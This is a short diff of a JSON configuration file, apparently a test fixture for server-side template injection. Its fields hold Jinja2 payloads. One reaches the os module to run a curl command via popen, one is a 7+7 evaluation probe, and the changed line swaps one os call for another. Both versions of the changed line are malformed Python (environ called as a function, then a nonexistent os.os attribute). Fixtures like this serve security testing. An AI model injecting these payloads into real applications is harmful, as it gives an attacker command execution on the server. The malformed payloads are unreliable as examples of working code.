@@ -2,5 +2,5 @@
   "project_name": "safe_default",
   "ssti_payload1": "{{ lipsum.__globals__['os'].popen('curl -s https://www.freepublicapis.com/api/apis?limit=1&sort=best').read() }}",
   "ssti_payload2": "{{ 7 + 7 }}",
-  "ssti_payload3": "{{ lipsum.__globals__['os'].environ('/Downloads') }}"
+  "ssti_payload3": "{{ lipsum.__globals__['os'].os.abort() }}"
 }
